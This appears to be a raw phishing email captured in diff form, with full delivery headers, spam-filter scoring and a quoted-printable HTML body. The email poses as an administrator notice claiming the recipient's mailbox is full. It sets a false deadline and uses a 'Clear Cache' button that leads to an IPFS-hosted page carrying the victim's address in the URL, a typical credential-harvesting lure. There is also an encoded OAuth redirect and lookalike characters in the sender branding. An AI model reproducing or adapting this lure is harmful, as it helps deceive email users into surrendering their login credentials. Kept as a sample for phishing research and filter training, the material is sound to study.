@@ -1,0 +1,211 @@
+Return-Path: <sales@host-xyz.asia>
+Delivered-To: novuste1@rs2.hpcnoc.com
+Received: from rs2.hpcnoc.com
+	by rs2.hpcnoc.com with LMTP
+	id qJcZJBezJWgzNCgAObGTvA
+	(envelope-from <sales@host-xyz.asia>)
+	for <novuste1@rs2.hpcnoc.com>; Thu, 15 May 2025 12:25:43 +0300
+Return-path: <sales@host-xyz.asia>
+Envelope-to: quintq@novustelltravel.com
+Delivery-date: Thu, 15 May 2025 12:25:43 +0300
+Received: from host-xyz.asia ([92.47.181.153]:58739)
+	by rs2.hpcnoc.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.98.1)
+	(envelope-from <sales@host-xyz.asia>)
+	id 1uFUqU-0000000B3hQ-3tBM
+	for quintq@novustelltravel.com;
+	Thu, 15 May 2025 12:25:43 +0300
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=host-xyz.asia;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=sales@host-xyz.asia;
+ bh=NfIV2cJfsBBsLTiJkxhYKTEoJYY=;
+ b=JlyocmYxxfbfifZl0h04FBe14xm6YslGbxn5n/KYoFcu491DELCwU7gYce05FruA7H+L0it0KWh5
+   ZWUDdQBFBiSNbSq2zyZ9uBSBgseEHlm6XgLHIccd5hC9pMv1a8cyDViSb5B3mzLk29Pp8z7Ss8Jp
+   26OQb1U5Kc12SJlGgzw=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=host-xyz.asia;
+ b=lXCUBVP4NU53MTJA//xJMulntQ414LKEBZmwJWyhvOQrQz71omGVCrw5NanvMkmpiNtBsGRks3Xt
+   bD1wXzWo0BoZd58IJHR72Z2FejfJedGB9tHq6piFydOZ0UApB6Yert6vHs7LmY9BMGINhXReiSlu
+   xtazYJi9/svVfyI1RVY=;
+From: Admin Notice <sales@host-xyz.asia>
+To: quintq@novustelltravel.com
+Subject: You are required to take action immediately to avoid mail malfunction
+Date: 15 May 2025 04:24:59 -0500
+Message-ID: <20250515042459.3B32D3F7416E91C3@host-xyz.asia>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=0.5
+X-Spam-Score: 5
+X-Spam-Bar: /
+X-Ham-Report: Spam detection software, running on the system "rs2.hpcnoc.com",
+ has NOT identified this incoming email as spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  20.27 GB 15.95 GB Your storage capacity is full. You must
+    clear your cache to release blocked messages. 
+ Content analysis details:   (0.5 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The query to
+                              Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [92.47.181.153 listed in sa-accredit.habeas.com]
+  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+                             query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                          [92.47.181.153 listed in sa-trusted.bondedsender.org]
+  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The query to
+                              Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [92.47.181.153 listed in bl.score.senderscore.com]
+  0.0 RCVD_IN_ZEN_BLOCKED_OPENDNS RBL: ADMINISTRATOR NOTICE: The query to
+                             zen.spamhaus.org was blocked due to usage of an
+                              open resolver. See
+                             https://www.spamhaus.org/returnc/pub/
+                             [92.47.181.153 listed in zen.spamhaus.org]
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was blocked.
+                             See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URI: ipfs.io]
+                             [URI: host-xyz.asia]
+  0.0 URIBL_DBL_BLOCKED_OPENDNS ADMINISTRATOR NOTICE: The query to
+                             dbl.spamhaus.org was blocked due to usage of an
+                              open resolver. See
+                             https://www.spamhaus.org/returnc/pub/
+                             [URI: ipfs.io]
+                             [URI: host-xyz.asia]
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+ -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
+                             domain
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+                             envelope-from domain
+  0.0 HTTP_EXCESSIVE_ESCAPES URI: Completely unnecessary %-escapes inside a
+                              URL
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
+  0.0 KAM_SHORT              Use of a URL Shortener for very short URL
+  0.6 URI_IPFSIO             References Interplanetary File System PtP content via
+                             ipfs.io, likely phishing
+  0.0 URI_IPFS               References Interplanetary File System PtP content, probable
+                             phishing
+X-Spam-Flag: NO
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<P>&nbsp;</P>
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
+ial; text-decoration-color: initial">&nbsp;</P>
+<P>
+<TABLE style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,2=
+55,255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial"=20
+cellSpacing=3D0 cellPadding=3D0 width=3D325 align=3Dcenter border=3D0>
+<TBODY>
+<TR style=3D"HEIGHT: 0.5em">
+<TD style=3D"WIDTH: 322px; BACKGROUND: rgb(218,60,47); MARGIN: 0px">&nbsp;<=
+/TD>
+<TD style=3D"BACKGROUND: rgb(224,224,224); MARGIN: 0px">&nbsp;</TD></TR></T=
+BODY></TABLE>
+<TABLE style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,2=
+55,255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial"=20
+cellSpacing=3D0 cellPadding=3D0 width=3D325 align=3Dcenter border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"MARGIN: 0px" align=3Dleft><SPAN style=3D"FONT-WEIGHT: bold; CO=
+LOR: rgb(218,60,47)">20.27 GB</SPAN></TD>
+<TD style=3D"MARGIN: 0px" align=3Dright><SPAN style=3D"FONT-WEIGHT: bold">1=
+5.95 GB</SPAN></TD></TR></TBODY></TABLE></P>
+<CENTER style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(3=
+4,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
+; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatu=
+res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial; text-decoration-style: initial; text-decor=
+ation-color: initial">&nbsp;</CENTER>
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
+ial; text-decoration-color: initial">&nbsp;</P>
+<CENTER style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(3=
+4,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
+; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatu=
+res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial; text-decoration-style: initial; text-decor=
+ation-color: initial">
+<P style=3D"FONT-SIZE: 15px; FONT-FAMILY: Helvetica, Arial, sans-serif, gds=
+herpa-regular; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
+RGIN: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT: 0px">Your storage&nbsp;capacit=
+y is full. You&nbsp;must clear your cache to release&nbsp;blocked messages.=
+<BR>&nbsp;</P>
+<P style=3D"FONT-SIZE: 15px; FONT-FAMILY: Helvetica, Arial, sans-serif, gds=
+herpa-regular; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
+RGIN: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT: 0px">You are required&nbsp;to =
+take action immediately to avoid mail&nbsp;malfunction.</P></CENTER>
+<CENTER style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(3=
+4,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
+; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatu=
+res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial; text-decoration-style: initial; text-decor=
+ation-color: initial">
+<P style=3D'FONT-SIZE: 18px; FONT-FAMILY: Arial, sans-serif, "Arial Bold", =
+gdsherpa-bold; FONT-WEIGHT: bold; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 28px; PADDING-RIGHT: 0px'>
+<A style=3D"BORDER-TOP: rgb(25,118,210) 10px solid; BORDER-RIGHT: rgb(25,11=
+8,210) 20px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(25,118,210)=
+ 10px solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: rgb(25,118,210) 20px solid; MARGIN: 0px; =
+DISPLAY: inline-block; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(25,118,210=
+); text-decoration-line: none; border-radius: 3px"=20
+href=3D"https://ipfs.io/ipfs/bafybeigpgbzvjisdvs3nbnp2qduugoccguot6jlbpbxn3=
+4hco5uhtw3yoq/index.html#quintq@novustelltravel.com" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://accounts.goo=
+gle.com/o/oauth2/v2/auth?prompt%3Dnone%26auto_signin%3DTrue%26access_type%3=
+Donline%26state%3D%26redirect_uri%3D%2568%2574%2574%2570%2573%253A%252F%252=
+F%2574%2561%2563%256F%256E%2573%2574%2572%2575%2563%2574%2569%256F%256E%257=
+3%252E%2563%256F%256D%252F%254D%2572%2578%2578%2578%252F%254D%2572%2578%257=
+8%2578%252F%26response_type%3Dcode%26client_id%3D453922390389-kl7f4mejr9kf5=
+v881mpp3obl2mmb77ft.apps.googleusercontent.com%26scope
+&#13;&#10;%3Dopenid%2Bhttps://www.googleapis.com/auth/userinfo.email%23mitu=
+l@flamingoexports.com&amp;source=3Dgmail&amp;ust=3D1747091010693000&amp;usg=
+=3DAOvVaw0PG4DRmwoZvmhCToYKRSfT">Clear Cache</A></P><BR><SPAN style=3D"FONT=
+-FAMILY: Avenir, Arial, Helvetica, sans-serif; LINE-HEIGHT: 16px"><FONT col=
+or=3D#ff0000><B><I>Note: Action is required before May 18, 2025</I></B></FO=
+NT></SPAN>=20
+<HR>
+
+<P><STRONG>Mailbox address:</STRONG><BR>Acct Summary:<SPAN>&nbsp;</SPAN><A =
+style=3D"COLOR: rgb(17,85,204)" target=3D_blank>quintq@novustelltravel.com<=
+/A><BR>&copy; 2025&nbsp;mitul&nbsp;C&#959;rp&#959;ration.</P></CENTER></BOD=
+Y></HTML>
